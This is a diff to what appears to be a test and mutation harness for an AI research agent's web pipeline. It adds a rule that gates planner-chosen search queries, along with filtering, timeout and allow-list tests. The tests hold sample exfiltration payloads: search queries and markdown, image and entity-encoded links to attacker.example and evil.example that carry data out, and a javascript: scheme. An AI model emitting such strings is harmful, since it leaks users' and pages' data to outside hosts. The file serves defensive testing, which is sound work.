@@ -46,6 +46,7 @@
  *   PR-37 "the port will answer"                — and a hung planner, provider, resolver or port hangs the run
  *   PR-38 "the planner is free"                 — and a planner call is not charged, or a budget has no ceiling, or Brave runs with no ledger
  *   PR-39 "the answer is only words"            — and an image, a link or a tag in the answer carries the evidence out
+ *   PR-40 "the query is only a question"       — and a search query carries an address, encoded data or a page out
  *   PR-T  "the tests exist"                     — and `.skip` keeps the proof while dropping the run
  *
  * THE MUTATIONS ARE IN THE BODIES. A pin on a call site survives a gutted function, so pins are taken from inside the
@@ -353,6 +354,26 @@ const TESTS = {
     "L5: the cache worst case is a stated bound, well under 256 MB",
     "L6: text a page hides with font size zero, zero opacity or an off-screen position is not extracted",
   ],
+  "projectos/core/test/research-final.test.ts": [
+    "a hung grant for a paid search is a TIMEOUT, the provider is never called, and nothing is charged",
+    "a hung grant for the planner ends the run with TIMEOUT before the planner is called",
+    "a grant that answers, throws or is slow but in time behaves as before",
+    "callWithin takes a result with no value for an error",
+    "runResearch and runWebSearch resolve with a refusal for a timer that gives {done:true} and no value",
+    "fetchGuarded stops when its total budget is spent, and no wait is longer than what is left",
+    "a run with a deadline gives its fetch what is left minus a margin, so six slow hops cannot pass the deadline",
+    "a fetch page with the default budget still follows an ordinary redirect",
+    "removes the reviewer's inputs: reference images and definitions, entity-encoded schemes, assembled tags, bare hosts",
+    "refuses text it cannot make stable: nesting deeper than the pass cap",
+    "keeps ordinary text that looks a little like markup or an address",
+    "keeps a cited source, a bare cited address, and removes any other tag but not an unknown one",
+    "does not loop or slow down on hostile input",
+    "runResearch refuses an answer the filter cannot make stable, and notes it",
+    "refuses an unlisted address on a named host whose path is longer than the named constant, and keeps a short one",
+    "a long path that the run listed verbatim is still fetchable",
+    "refuses a query with a URL, an @, encoded data, a long slice of a fetched page, or a length over the cap, with a neutral note and an exact audit reason",
+    "lets an ordinary query through, a short quote of a page through, and counts nothing against it",
+  ],
   "projectos/agent/test/research.test.ts": [
     "loads a committed policy and judges its rules: the positive control",
     "refuses a reader that returns something with no commit, such as a working-tree read",
@@ -408,6 +429,7 @@ const RULE_NAMES = {
   "PR-37": "a wait is unbounded",
   "PR-38": "a planner call is free, a budget has no ceiling, or Brave has no ledger",
   "PR-39": "the answer carries an address out",
+  "PR-40": "a planner-chosen search query is an ungated outbound string",
   "PR-T": "the proof does not run",
 };
 
@@ -423,9 +445,9 @@ const PIN_RULES = [
     P(SEARCHRT, "askOne", "if (reserved !== null) return { refusal: reserved.refusal };"),
   ] },
   { rule: "PR-10", says: "the grant and the room are no longer asked", pins: [
-    P(BUDGET, "granted", "return (await grant(request)) === true;"),
-    P(BUDGET, "granted", "  } catch {\n    return false;"),
-    P(BUDGET, "reservePaidQuery", "if (!(await granted(grant, request))) return researchRefused('NO_GRANT'"),
+    P(BUDGET, "granted", "return { yes: (await grant(request)) === true };"),
+    P(BUDGET, "granted", "    } catch {\n      return { yes: false };"),
+    P(BUDGET, "reservePaidQuery", "if (answer !== 'yes') return researchRefused('NO_GRANT'"),
     P(BUDGET, "reservePaidQuery", "if (!book.reserve(request.microUsd)) return researchRefused('OVER_BUDGET'"),
     P(BUDGET, null, "if (capMicroUsd === null || !isMicro(microUsd, 1) || reserved + microUsd > capMicroUsd) return false;"),
     P(BUDGET, null, "reserved += microUsd;"),
@@ -486,7 +508,7 @@ const PIN_RULES = [
     P(GUARD, null, "export const MAX_HOPS_CEILING = 5;"),
     P(GUARD, null, "const REDIRECT_STATUSES: readonly number[] = [301, 302, 303, 307, 308];"),
     P(GUARD, "fetchGuarded", "const maxHops = isCount(params.maxHops, 0) ? Math.min(params.maxHops, MAX_HOPS_CEILING) : null;"),
-    P(GUARD, "fetchGuarded", "const verdict = await judgeUrl(current, deps, params.mode);"),
+    P(GUARD, "fetchGuarded", "const verdict = await judgeUrl(current, hopDeps, params.mode);"),
     P(GUARD, "fetchGuarded", "if (!verdict.ok) return researchRefused('URL_REFUSED'"),
     P(GUARD, "fetchGuarded", "if (hop === maxHops) return researchRefused('TOO_MANY_REDIRECTS'"),
     P(GUARD, "fetchGuarded", "const next = resolveRedirectTarget(verdict.url, headerOf(response.headers, 'location'));"),
@@ -579,7 +601,7 @@ const PIN_RULES = [
   { rule: "PR-23", says: "the clock is no longer read through a guard", pins: [
     P(PORTS, "createClockGuard", "if (typeof reading !== 'number' || !Number.isFinite(reading) || reading < 0 || reading < last) return null;"),
     P(PORTS, "createClockGuard", "last = reading;"),
-    P(GUARD, "fetchGuarded", "if (clock.now() === null) return researchRefused('BAD_CLOCK'"),
+    P(GUARD, "fetchGuarded", "if (at === null) return researchRefused('BAD_CLOCK'"),
     P(FETCH, "fetchPage", "if (fetchedAtMs === null) return researchRefused('BAD_CLOCK'"),
     P(CACHE, "createPageCache", "if (nowMs - held.storedAtMs >= options.ttlMs) {"),
     P(LOOP, "runResearch", "if (startedAt === null) return refusedRun('BAD_CLOCK'"),
@@ -652,10 +674,12 @@ const PIN_RULES = [
   { rule: "PR-33", says: "a fetch address is no longer held to the run's own addresses", pins: [
     P(PROVENANCE, null, "export const MAX_FETCH_URL_CHARS = 1024;"),
     P(PROVENANCE, null, "export const MAX_HOSTS_PER_RUN = 4;"),
+    P(PROVENANCE, null, "export const MAX_ALLOW_LIST_PATH_CHARS = 64;"),
+    P(PROVENANCE, "urlProvenanceProblem", "|| pathOf(canonical).length > MAX_ALLOW_LIST_PATH_CHARS) return 'not-listed';"),
     P(PROVENANCE, "urlProvenanceProblem", "if (url.length > MAX_FETCH_URL_CHARS) return 'url-too-long';"),
     P(PROVENANCE, "urlProvenanceProblem", "if (!listed.has(canonical)) {"),
     P(PROVENANCE, "urlProvenanceProblem", "const named = policy.enabled === true && policy.mode === 'allow' && policy.rules.some((rule) => rule.pattern === host);"),
-    P(PROVENANCE, "urlProvenanceProblem", "if (!named || url.includes('?') || url.includes('#')) return 'not-listed';"),
+    P(PROVENANCE, "urlProvenanceProblem", "if (!named || url.includes('?') || url.includes('#') ||"),
     P(PROVENANCE, "urlProvenanceProblem", "return hosts.has(host) || hosts.size < MAX_HOSTS_PER_RUN ? null : 'too-many-hosts';"),
     P(LOOP, "runResearch", "const problem = urlProvenanceProblem(row.url, listed, deps.policy, hosts);"),
     P(LOOP, "runResearch", "const listed = new Set<string>(listedUrlsOf(question));"),
@@ -707,13 +731,23 @@ const PIN_RULES = [
     P(EVIDENCE, "renderResearchEvidence", "...(page.title === undefined ? [] : ([['Title', labelOf(page.title)]] as const)),"),
   ] },
   { rule: "PR-37", says: "a wait is no longer bounded by an injected timer", pins: [
-    P(TIMING, null, "export const DEFAULT_TIMEOUTS: ResearchTimeouts = { dnsMs: 5_000, fetchMs: 32_000, searchMs: 20_000, plannerMs: 60_000 };"),
+    P(TIMING, null, "export const DEFAULT_TIMEOUTS: ResearchTimeouts = { dnsMs: 5_000, grantMs: 5_000, fetchMs: 32_000, fetchTotalMs: 60_000, searchMs: 20_000, plannerMs: 60_000 };"),
     P(TIMING, "timeoutOf", "return isBudget(wanted) ? Math.min(wanted, DEFAULT_TIMEOUTS[which]) : DEFAULT_TIMEOUTS[which];"),
     P(TIMING, "callWithin", "if (typeof timer?.within !== 'function' || !isBudget(ms)) return { kind: 'error' };"),
     P(TIMING, "callWithin", "if (row.done === false) return { kind: 'timeout' };"),
-    P(TIMING, "callWithin", "return row.done === true ? { kind: 'value', value: row.value as T } : { kind: 'error' };"),
     P(GUARD, "answerOf", "const timed = await callWithin(deps.timer, timeoutOf(deps.timeouts, 'dnsMs'), (signal) => deps.resolver(host, signal));"),
     P(GUARD, "answerOf", "if (timed.kind === 'timeout') return { verdict: { ok: false, reason: 'dns-failed', timedOut: true } };"),
+    P(BUDGET, "granted", "if (timed.kind === 'timeout') return 'timeout';"),
+    P(BUDGET, "granted", "const timed = await callWithin(timer, timeoutOf(timeouts, 'grantMs'), async () => {"),
+    P(BUDGET, "reservePaidQuery", "if (answer === 'timeout') return researchRefused('TIMEOUT', 'the spend grant did not answer in time');"),
+    P(GUARD, "fetchGuarded", "const totalMs = timeoutOf(deps.timeouts, 'fetchTotalMs');"),
+    P(GUARD, "fetchGuarded", "if (left < 1) return researchRefused('TIMEOUT', 'the fetch used up its total time', { hop });"),
+    P(GUARD, "fetchGuarded", "const hopMs = Math.min(timeoutOf(deps.timeouts, 'fetchMs'), timeoutMs + FETCH_GRACE_MS, left);"),
+    P(GUARD, "fetchGuarded", "dnsMs: Math.min(timeoutOf(deps.timeouts, 'dnsMs'), left)"),
+    P(TIMING, "callWithin", "return row.done === true && 'value' in row ? { kind: 'value', value: row.value as T } : { kind: 'error' };"),
+    P(LOOP, "runResearch", "fetchTotalMs: Math.max(1, Math.min(timeoutOf(deps.timeouts, 'fetchTotalMs'), left - DEADLINE_MARGIN_MS)),"),
+    P(LOOP, "runResearch", "|| !('action' in planned.value)) {"),
+    P(SEARCHRT, "askOne", "typeof timed.value === 'object' && timed.value !== null && 'answer' in timed.value"),
     P(GUARD, "fetchGuarded", "const timed = await callWithin(deps.timer, hopMs, (signal) => deps.fetch("),
     P(GUARD, "fetchGuarded", "if (timed.kind === 'timeout') return researchRefused('TIMEOUT', 'the fetch port did not answer in time', { hop });"),
     P(GUARD, "fetchGuarded", "if (!verdict.ok && verdict.timedOut === true) return researchRefused('TIMEOUT', 'the resolver did not answer in time', { hop });"),
@@ -735,7 +769,7 @@ const PIN_RULES = [
     P(LOOP, null, "const plannerCostOf = (price: PlannerPrice, chars: number): number => price.baseMicroUsd + Math.ceil(chars / 1000) * price.perKiloCharMicroUsd;"),
     P(LOOP, "runResearch", "const cost = plannerCostOf(deps.plannerPrice, chars);"),
     P(LOOP, "runResearch", "if (cost > 0) {"),
-    P(LOOP, "runResearch", "const gate = await reservePaidQuery(spend, deps.grant, { scope, provider: 'planner', microUsd: cost });"),
+    P(LOOP, "runResearch", "const gate = await reservePaidQuery(spend, deps.grant, { scope, provider: 'planner', microUsd: cost }, deps.timer,"),
     P(LOOP, "runResearch", "return refuse(gate.refusal.code, gate.refusal.message, step - 1);"),
     P(LOOP, "runResearch", "|| !priceUsable(deps.plannerPrice)) {"),
     P(BRAVE, "createBraveProvider", "if (typeof config.ledger !== 'function') return researchRefused('INVALID_REQUEST'"),
@@ -744,17 +778,41 @@ const PIN_RULES = [
   ] },
   { rule: "PR-39", says: "the answer text is no longer filtered of addresses that are not cited", pins: [
     P(FILTER, null, "export const LINK_REMOVED = '[link removed]';"),
-    P(FILTER, null, String.raw`const AUTOLINK = /<[A-Za-z][A-Za-z0-9+.-]{1,30}:[^<>\s]{0,2048}>/g;`),
-    P(FILTER, null, String.raw`const TAG = /<[/!?]?[A-Za-z!-][^<>]{0,2048}>/g;`),
-    P(FILTER, null, String.raw`const IMAGE = /!\[[^\]\n]{0,500}\]\([^)\n]{0,2048}\)/g;`),
-    P(FILTER, null, String.raw`const LINK = /\[([^\]\n]{0,500})\]\(([^)\n]{0,2048})\)/g;`),
-    P(FILTER, "filterAnswerText", "let out = text.replace(AUTOLINK, (whole) => (cited.has(whole.slice(1, -1)) ? whole : drop()));"),
-    P(FILTER, "filterAnswerText", "out = out.replace(IMAGE, drop);"),
-    P(FILTER, "filterAnswerText", "out = out.replace(RAW, (match) => {"),
-    P(FILTER, "filterAnswerText", "out = out.replace(LINK, (whole, words: string, target: string) => (cited.has(target.trim()) ? whole : `${words} ${drop()}`));"),
-    P(FILTER, "filterAnswerText", "return cited.has(address) ? match : `${drop()}${tail}`;"),
+    P(FILTER, null, "export const MAX_FILTER_PASSES = 8;"),
+    P(FILTER, null, "const TAG = new RegExp(String.raw`<\\/?(${TAG_NAMES.join('|')})(?=[\\s/>])[^<>]{0,2048}>`, 'gi');"),
+    P(FILTER, "decode", "if (!text.includes('&')) return text;"),
+    P(FILTER, "decode", "if (name !== undefined) return NAMED_ENTITIES[name.toLowerCase()] ?? whole;"),
+    P(FILTER, "pass", "let out = input.replace(COMMENT, gone).replace(DECLARATION, gone);"),
+    P(FILTER, "pass", "out = out.replace(AUTOLINK, (whole) => (cited.has(whole.slice(1, -1)) ? whole : drop()));"),
+    P(FILTER, "pass", "out = out.replace(TAG, (whole, name: string) => (TYPE_LIKE.has(name.toLowerCase()) && /^<[A-Z][a-z]*>$/.test(whole) ? whole : gone()));"),
+    P(FILTER, "pass", "out = out.replace(IMAGE, drop).replace(IMAGE_REF, drop);"),
+    P(FILTER, "pass", "out = out.replace(LINK, (whole, words: string, target: string) => (cited.has(target.trim()) ? whole : `${words} ${drop()}`));"),
+    P(FILTER, "pass", "out = out.replace(LINK_REF, (_whole, words: string) => `${words} ${drop()}`);"),
+    P(FILTER, "pass", "out = out.replace(REFERENCE_DEFINITION, (whole, target: string) => (cited.has(target) ? whole : drop()));"),
+    P(FILTER, "pass", "out = out.replace(SCHEME_ADDRESS, (match) => address(match, cited));"),
+    P(FILTER, "pass", "out = out.replace(WWW_ADDRESS, (match) => address(match, cited));"),
+    P(FILTER, "pass", "out = out.replace(SCHEME_RELATIVE, drop);"),
+    P(FILTER, "pass", "out = out.replace(BARE_ADDRESS, (match) => address(match, bare));"),
+    P(FILTER, "pass", "out = out.replace(SCRIPT_SCHEME, drop);"),
+    P(FILTER, "pass", "return kept.has(trimmed) ? match : `${drop()}${tail}`;"),
+    P(FILTER, "filterAnswerText", "for (let round = 0; round < MAX_FILTER_PASSES; round += 1) {"),
+    P(FILTER, "filterAnswerText", "const next = pass(decode(current), cited, bare);"),
+    P(FILTER, "filterAnswerText", "if (next.text === current) return { text: current, removed, stable: true };"),
+    P(FILTER, "filterAnswerText", "return { text: LINK_REMOVED, removed, stable: false };"),
+    P(LOOP, "runResearch", "if (!filtered.stable) {"),
     P(LOOP, "runResearch", "const filtered = filterAnswerText(admitted.answer.text, citedPages.flatMap((page) => [page.finalUrl, page.requestedUrl]));"),
     P(LOOP, "runResearch", "value: { answer: { text: filtered.text, citations: admitted.answer.citations }, sources, removedFromAnswer: filtered.removed },"),
+  ] },
+  { rule: "PR-40", says: "a planner-chosen search query is no longer gated", pins: [
+    P(PROVENANCE, null, "export const MAX_PLANNER_QUERY_CHARS = 200;"),
+    P(PROVENANCE, null, "export const MAX_QUERY_QUOTE_CHARS = 40;"),
+    P(PROVENANCE, null, "export const MIN_ENCODED_RUN_CHARS = 32;"),
+    P(PROVENANCE, "queryProvenanceProblem", "if (query.length > MAX_PLANNER_QUERY_CHARS) return 'query-too-long';"),
+    P(PROVENANCE, "queryProvenanceProblem", "if (ADDRESS_IN_QUERY.test(query)) return 'query-has-address';"),
+    P(PROVENANCE, "queryProvenanceProblem", "if (ENCODED_RUN.test(query)) return 'query-has-encoded-data';"),
+    P(PROVENANCE, "queryProvenanceProblem", "if (pages.some((page) => page.includes(slice))) return 'query-quotes-a-page';"),
+    P(LOOP, "runResearch", "const queryProblem = kind === 'search' && row !== null ? queryProvenanceProblem(row.query, [...pages.values()].map((page) => page.text)) : null;"),
+    P(LOOP, "runResearch", "note('search refused: QUERY_REFUSED/not-sendable');"),
   ] },
   { rule: "PR-32", says: "a limit the caller sends is no longer held to a bound", pins: [
     P(GUARD, "fetchGuarded", "const timeoutMs = isCount(params.timeoutMs, 1) ? Math.min(params.timeoutMs, MAX_FETCH_TIMEOUT_MS) : null;"),
@@ -911,6 +969,8 @@ function check(raw) {
   // PR-23: nothing in core asks the time of anything but the injected clock, and the clock is made once into a guard.
   for (const rel of [GUARD, FETCH, LOOP]) if (!/createClockGuard\(/.test(code[rel])) E("PR-23", `${rel} does not read the clock through a guard`);
 
+  // PR-40: the query is judged before the search is asked.
+  if (!inOrder(bodyOf(code[LOOP], "runResearch") ?? "", ["queryProvenanceProblem(", "runWebSearch("])) E("PR-40", "a search is asked before its query is judged");
   // PR-33 .. PR-39: the order of the new steps.
   const stepBody = bodyOf(code[LOOP], "runResearch") ?? "";
   if (!inOrder(stepBody, ["urlProvenanceProblem(", "fetchPage("])) E("PR-33", "a fetch is made before its address is judged against the run");
@@ -1880,6 +1940,102 @@ await expectIt('PR-39', async () => {
   return out.ok === true && !/evil/.test(out.value.answer.text) && out.value.removedFromAnswer >= 2;
 });
 
+// PR-33: in allow-list mode the path is bounded.
+await expectIt('PR-33', async () => {
+  const made = core.createWebsitePolicy({ enabled: true, mode: 'allow', domains: ['example.com'] });
+  const longPath = 'https://example.com/' + 'a'.repeat(core.MAX_ALLOW_LIST_PATH_CHARS);
+  const short = 'https://example.com/other';
+  const r = planRig([{ kind: 'fetch', url: longPath }, { kind: 'fetch', url: short }], { [short]: { body: html('<p>ok</p>') }, [longPath]: { body: html('<p>caught</p>') } }, { policy: made.policy });
+  await core.runResearch({ scope: SCOPE, question: 'What does bread need?', maxSteps: 2 }, r.deps);
+  return r.requests.length >= 1 && r.requests.every((q) => q.url === short);
+});
+
+// PR-37: a grant is a wait, a timer's answer is judged, and the hops share one budget.
+await expectIt('PR-37', async () => {
+  let called = 0;
+  const spend = core.createSpendBook({ maxMicroUsd: 1000 });
+  const out = await core.runWebSearch({ scope: SCOPE, query: 'bread' }, { providers: [providerOf({ id: 'brave', paid: true, microUsdPerQuery: 400, search: async () => { called += 1; return []; } })], spend, grant: () => hang(), timer: timerOf(), timeouts: { grantMs: 30 } });
+  const r = planRig([search()], PAGES, { plannerPrice: { baseMicroUsd: 100, perKiloCharMicroUsd: 0 }, grant: () => hang(), timeouts: { grantMs: 30 } });
+  const b = await core.runResearch({ scope: SCOPE, question: Q, budget: { maxMicroUsd: 1000 } }, r.deps);
+  return out.ok === false && out.refusal.code === 'TIMEOUT' && called === 0 && spend.spent() === 0 && b.refusal.code === 'TIMEOUT' && r.views.length === 0;
+});
+await expectIt('PR-37', async () => {
+  const noValue = { within: async () => ({ done: true }) };
+  const odd = { within: async () => ({ done: true, value: 5 }) };
+  const ce = await core.callWithin(noValue, 10, async () => 1);
+  let threw = false;
+  let a;
+  let b;
+  let c;
+  let d;
+  try {
+    a = await core.runResearch({ scope: SCOPE, question: Q }, planRig([search()], PAGES, { timer: noValue }).deps);
+    b = await sask(sdeps([providerOf({ id: 'searx' })], { timer: noValue }));
+    c = await core.runResearch({ scope: SCOPE, question: Q }, planRig([search()], PAGES, { timer: odd }).deps);
+    d = await sask(sdeps([providerOf({ id: 'searx' })], { timer: odd }));
+  } catch {
+    threw = true;
+  }
+  return ce.kind === 'error' && threw === false && a.ok === false && b.ok === false && c.ok === false && d.ok === false;
+});
+await expectIt('PR-37', async () => {
+  const makeWorld = () => {
+    const world = { now: 0, waits: [], requests: [] };
+    world.timer = { within: async (ms, work) => { world.waits.push(ms); return { done: true, value: await work(new AbortController().signal) }; } };
+    world.fetch = async (request) => {
+      world.requests.push(request.url);
+      world.now += 5000;
+      return { status: 302, headers: { location: request.url + 'x' }, body: '', bytesRead: 0, truncated: false, connectedAddress: request.pinnedAddresses[0] };
+    };
+    return world;
+  };
+  const w1 = makeWorld();
+  const direct = await guard(A, { resolver: resolverOf({ 'example.com': [PUB] }).resolver, fetch: w1.fetch, policy: OPEN, clock: () => w1.now, timer: w1.timer, timeouts: { fetchTotalMs: 12000 } }, { timeoutMs: 5000 });
+  const w2 = makeWorld();
+  const r = planRig([fetchA], {}, { clock: () => w2.now, timer: w2.timer, fetch: w2.fetch });
+  await core.runResearch({ scope: SCOPE, question: Q, deadlineMs: 12000, maxSteps: 2 }, r.deps);
+  return direct.ok === false && direct.refusal.code === 'TIMEOUT' && w1.requests.length <= 3 && w1.waits.every((ms, i) => ms <= 12000 - 5000 * Math.floor(i / 3)) && w2.requests.length <= 3 && Math.max(...w2.waits) <= 12000;
+});
+
+// PR-39: the reviewer's inputs, the false positives, and the fixpoint.
+await expectIt('PR-39', async () => {
+  const nl = String.fromCharCode(10);
+  const attacks = ['![x][1]' + nl + '[1]: //evil.example/a?d=S', '[1]: https&#58;//evil.example/?d=S', '<<b>img src=//evil.example/?d=S>', 'visit evil.example/x?d=S now', 'https&amp;#58;//evil.example/?d=S', 'https&colon;//evil.example/?d=S', '//evil.example/a?d=S', 'javascript&#58;alert(1)', '[click][ref] and see www.evil.example/x'];
+  for (const attack of attacks) {
+    const f = core.filterAnswerText(attack, ['https://example.com/a']);
+    if (/evil|d=S|<img|javascript/i.test(f.text) || f.stable !== true || f.removed < 1) return false;
+  }
+  const exact = [['<https://evil.example/auto>', core.LINK_REMOVED], ['[1]: //evil.example/a', core.LINK_REMOVED], ['[click][ref]', 'click ' + core.LINK_REMOVED]];
+  for (const [text, want] of exact) if (core.filterAnswerText(text, []).text !== want) return false;
+  return true;
+});
+await expectIt('PR-39', async () => {
+  for (const text of ['Map<String, Integer> counts words', 'a < b > c', 'Input data: 5', 'use vector<int> and std::map<int, int>', 'Result: 3 // a comment', 'see file.txt and README.md', 'version 1.2.3/4', 'List<Object> items']) {
+    const f = core.filterAnswerText(text, ['https://example.com/a']);
+    if (f.text !== text || f.removed !== 0) return false;
+  }
+  const nested = (s, d) => (d === 0 ? s : nested(s.replace(/&/g, '&amp;'), d - 1));
+  const deep = core.filterAnswerText(nested('https&#58;//evil.example/?d=S', 12), []);
+  const shallow = core.filterAnswerText(nested('https&#58;//evil.example/?d=S', 2), []);
+  const bare = core.filterAnswerText('Source: example.com/a and example.com/a?d=S', ['https://example.com/a']);
+  const tags = core.filterAnswerText('x <b>bold</b> <Foo>', []);
+  const r = planRig([fetchA, (view) => ({ kind: 'answer', text: nested('see https&#58;//evil.example/?d=S', 12), citations: [{ path: pathOf(view), startLine: 1, endLine: 1 }] })], PAGES);
+  const out = await core.runResearch({ scope: SCOPE, question: Q, maxSteps: 3 }, r.deps);
+  return deep.stable === false && shallow.stable === true && !/evil/.test(shallow.text) && bare.text.includes('Source: example.com/a and') && !bare.text.includes('d=S') && tags.text === 'x bold <Foo>' && out.ok === false && r.views.at(-1).notes.includes('answer refused: answer-unfilterable');
+});
+
+// PR-40: a planner-chosen search query is an outbound string, and it is gated.
+await expectIt('PR-40', async () => {
+  const page = html('<p>The secret recipe is two cups of flour mixed with one cup of water and a pinch of salt, kneaded for ten minutes.</p>');
+  const queries = ['bread https://attacker.example/c?d=1', 'bread attacker.example/c', 'bread user@attacker.example', 'bread ' + 'A1b2C3d4'.repeat(5), 'bread 0123456789abcdef0123456789abcdef0123', 'what about the secret recipe is two cups of flour mixed with one cup of water and a pinch', 'x'.repeat(core.MAX_PLANNER_QUERY_CHARS + 1)];
+  const r = planRig([fetchA, ...queries.map((query) => ({ kind: 'search', query }))], { [A]: { body: page } });
+  const out = await core.runResearch({ scope: SCOPE, question: Q, maxSteps: queries.length + 2 }, r.deps);
+  const reasons = out.audit.filter((e) => e.action === 'search').map((e) => e.reason).slice(0, queries.length).join();
+  const fine = planRig([fetchA, { kind: 'search', query: 'bread flour water' }, { kind: 'search', query: 'two cups of flour' }], { [A]: { body: page } });
+  await core.runResearch({ scope: SCOPE, question: Q, maxSteps: 4 }, fine.deps);
+  return reasons === 'query-has-address,query-has-address,query-has-address,query-has-encoded-data,query-has-encoded-data,query-quotes-a-page,query-too-long' && r.views.at(-1).notes.filter((n) => n === 'search refused: QUERY_REFUSED/not-sendable').length >= queries.length && r.searches.length === 0 && fine.views.at(-1).notes.every((n) => !n.includes('QUERY_REFUSED')) && fine.searches.length >= 2;
+});
+
 console.log(JSON.stringify({ count: count, failed: [...failed].sort() }));
 `;
 
@@ -1912,12 +2068,11 @@ const MUTATIONS = [
   // PR-9 .. PR-11: the paid search.
   M("a-paid-search-needs-no-budget", "PR-9", BUDGET, "if (book.capMicroUsd === null) return researchRefused('BUDGET_REQUIRED', 'a paid search needs a budget of whole micro-USD');", ""),
   M("the-budget-defaults", "PR-9", BUDGET, "const capMicroUsd = isMicro(asked, 1) ? ceiling(asked) : null;", "const capMicroUsd = isMicro(asked, 1) ? ceiling(asked) : 1_000_000;"),
-  M("the-budget-is-asked-last", "PR-9", BUDGET, "  if (book.capMicroUsd === null) return researchRefused('BUDGET_REQUIRED', 'a paid search needs a budget of whole micro-USD');\n  if (!(await granted(grant, request))) return researchRefused('NO_GRANT', 'no spend grant confirms this paid search');\n  if (!book.reserve(request.microUsd)) return researchRefused('OVER_BUDGET', 'this paid search does not fit the budget that is left');\n",
-    "  if (!(await granted(grant, request))) return researchRefused('NO_GRANT', 'no spend grant confirms this paid search');\n  if (!book.reserve(request.microUsd)) return researchRefused('OVER_BUDGET', 'this paid search does not fit the budget that is left');\n  if (book.capMicroUsd === null) return researchRefused('BUDGET_REQUIRED', 'a paid search needs a budget of whole micro-USD');\n"),
-  M("the-provider-is-called-before-the-money", "PR-10", SEARCHRT, "  if (price.paid) {\n    const reserved = await reservePaidQuery(deps.spend, deps.grant, { scope: request.scope, provider: provider.id, microUsd: price.microUsd });", "  const early = await provider.search({ query: request.query, count: request.count });\n  if (price.paid) {\n    const reserved = await reservePaidQuery(deps.spend, deps.grant, { scope: request.scope, provider: provider.id, microUsd: price.microUsd });", ["PR-11"]),
-  M("a-truthy-grant-is-a-grant", "PR-10", BUDGET, "return (await grant(request)) === true;", "return Boolean(await grant(request));"),
-  M("a-failing-grant-is-a-grant", "PR-10", BUDGET, "  } catch {\n    return false;", "  } catch {\n    return true;"),
-  M("the-grant-is-never-asked", "PR-10", BUDGET, "  if (!(await granted(grant, request))) return researchRefused('NO_GRANT', 'no spend grant confirms this paid search');\n", ""),
+  M("the-budget-is-asked-last", "PR-9", BUDGET, "  if (book.capMicroUsd === null) return researchRefused('BUDGET_REQUIRED', 'a paid search needs a budget of whole micro-USD');\n  const answer = await granted(grant, request, timer, timeouts);\n  if (answer === 'timeout') return researchRefused('TIMEOUT', 'the spend grant did not answer in time');\n  if (answer !== 'yes') return researchRefused('NO_GRANT', 'no spend grant confirms this paid search');\n  if (!book.reserve(request.microUsd)) return researchRefused('OVER_BUDGET', 'this paid search does not fit the budget that is left');\n", "  const answer = await granted(grant, request, timer, timeouts);\n  if (answer === 'timeout') return researchRefused('TIMEOUT', 'the spend grant did not answer in time');\n  if (answer !== 'yes') return researchRefused('NO_GRANT', 'no spend grant confirms this paid search');\n  if (!book.reserve(request.microUsd)) return researchRefused('OVER_BUDGET', 'this paid search does not fit the budget that is left');\n  if (book.capMicroUsd === null) return researchRefused('BUDGET_REQUIRED', 'a paid search needs a budget of whole micro-USD');\n"),
+  M("the-provider-is-called-before-the-money", "PR-10", SEARCHRT, "  if (price.paid) {\n    const reserved = await reservePaidQuery(deps.spend, deps.grant, { scope: request.scope, provider: provider.id, microUsd: price.microUsd }, deps.timer, deps.timeouts);", "  const early = await provider.search({ query: request.query, count: request.count });\n  if (price.paid) {\n    const reserved = await reservePaidQuery(deps.spend, deps.grant, { scope: request.scope, provider: provider.id, microUsd: price.microUsd }, deps.timer, deps.timeouts);", ["PR-11"]),
+  M("a-truthy-grant-is-a-grant", "PR-10", BUDGET, "return { yes: (await grant(request)) === true };", "return { yes: Boolean(await grant(request)) };"),
+  M("a-failing-grant-is-a-grant", "PR-10", BUDGET, "    } catch {\n      return { yes: false };", "    } catch {\n      return { yes: true };"),
+  M("the-grant-is-never-asked", "PR-10", BUDGET, "  const answer = await granted(grant, request, timer, timeouts);\n  if (answer === 'timeout') return researchRefused('TIMEOUT', 'the spend grant did not answer in time');\n  if (answer !== 'yes') return researchRefused('NO_GRANT', 'no spend grant confirms this paid search');\n", "", ["PR-37"]),
   M("the-room-is-never-asked", "PR-10", BUDGET, "reserved + microUsd > capMicroUsd) return false;", "false) return false;"),
   M("a-failure-is-always-refunded", "PR-11", SEARCHRT, "if (price.paid && (kind === 'not_sent' || kind === 'not_configured')) deps.spend.release(price.microUsd);", "if (price.paid) deps.spend.release(price.microUsd);"),
   M("a-failure-is-never-refunded", "PR-11", SEARCHRT, "if (price.paid && (kind === 'not_sent' || kind === 'not_configured')) deps.spend.release(price.microUsd);", ""),
@@ -2030,7 +2185,7 @@ const MUTATIONS = [
   M("a-pin-moved-into-a-comment-does-not-count", "PR-24", LOOP, "export const MAX_STEPS_CEILING = 12;", "// export const MAX_STEPS_CEILING = 12;\nexport const MAX_STEPS_CEILING = 1200;"),
   M("the-run-addresses-are-not-asked", "PR-33", LOOP, "const problem = urlProvenanceProblem(row.url, listed, deps.policy, hosts);", "const problem = null;"),
   M("a-subdomain-of-an-allowed-host-is-allowed", "PR-33", PROVENANCE, "rule.pattern === host)", "host.endsWith(rule.pattern))"),
-  M("a-query-is-allowed-in-allow-mode", "PR-33", PROVENANCE, "if (!named || url.includes('?') || url.includes('#')) return 'not-listed';", "if (!named) return 'not-listed';"),
+  M("a-query-is-allowed-in-allow-mode", "PR-33", PROVENANCE, "url.includes('?') || url.includes('#') || ", ""),
   M("the-host-cap-goes", "PR-33", PROVENANCE, "hosts.has(host) || hosts.size < MAX_HOSTS_PER_RUN ? null : 'too-many-hosts'", "null"),
   M("the-length-cap-goes", "PR-33", PROVENANCE, "if (url.length > MAX_FETCH_URL_CHARS) return 'url-too-long';", ""),
   M("a-search-result-is-not-listed", "PR-33", LOOP, "if (canonical !== null && listed.size < 400) listed.add(canonical);", ""),
@@ -2072,24 +2227,49 @@ const MUTATIONS = [
   M("brave-needs-no-ledger", "PR-38", BRAVE, "if (typeof config.ledger !== 'function') return researchRefused('INVALID_REQUEST', 'Brave is paid and is not enabled without a cross-run ledger that answers exactly true');", ""),
   M("a-truthy-ledger-is-a-yes", "PR-38", BRAVE, "approved = (await config.ledger({ scope, provider: 'brave', microUsd: price })) === true;", "approved = Boolean(await config.ledger({ scope, provider: 'brave', microUsd: price }));"),
   M("a-ledger-that-says-no-is-ignored", "PR-38", BRAVE, "if (!approved) throw new SearchProviderError('not_sent', 'the cross-run ledger did not confirm this query');", ""),
